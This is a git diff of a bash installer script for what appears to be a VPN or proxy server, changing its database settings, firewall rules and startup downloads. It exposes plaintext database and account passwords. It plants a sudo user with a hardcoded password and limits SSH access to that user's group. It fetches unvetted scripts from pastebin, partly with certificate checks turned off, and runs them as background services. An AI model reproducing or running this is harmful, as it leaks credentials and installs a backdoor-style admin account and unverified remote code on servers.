@@ -1,10 +1,10 @@
 #!/bin/bash
 cp /usr/share/zoneinfo/Asia/Riyadh /etc/localtime
 #Database Details
-HOST='172.105.250.34';
-USER='scvpnapp_yoyop';
-PASS='@@AlaMinbd27';
-DBNAME='scvpnapp_yoyop';
+HOST='50.116.18.242';
+USER='loveyoun_loveyou';
+PASS='@@Nuralom1';
+DBNAME='loveyoun_loveyou';
 
 install_require()
 {
@@ -619,7 +619,7 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@@Alamin123 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:@@Nuralom1 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
@@ -652,8 +652,18 @@ echo '* soft nofile 512000
 * hard nofile 512000' >> /etc/security/limits.conf
 ulimit -n 512000
 
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o enp1s0 -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o enp1s0 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o eth0 -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o eth0 -j SNAT --to-source "$(curl ipecho.net/plain)"
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o ens3 -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o ens3 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o eth0 -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o eth0 -j SNAT --to-source "$(curl ipecho.net/plain)"
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o ens3 -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o ens3 -j SNAT --to-source "$(curl ipecho.net/plain)"
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o enp1s0 -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o enp1s0 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
 iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
 iptables-save > /etc/iptables_rules.v4
@@ -664,11 +674,11 @@ sysctl -p
 
 install_rclocal(){
   {
-    wget https://pastebin.com/raw/xtPc5t1k -O /etc/ubuntu
+    wget https://pastebin.com/raw/KzEVhTdG -O /etc/ubuntu
     dos2unix /etc/ubuntu
     chmod +x /etc/ubuntu    
     screen -dmS socks python /etc/ubuntu
-    wget --no-check-certificate https://pastebin.com/raw/658HpnLd -O /etc/systemd/system/rc-local.service
+    wget --no-check-certificate https://pastebin.com/raw/GheKR24z -O /etc/systemd/system/rc-local.service
     echo "#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
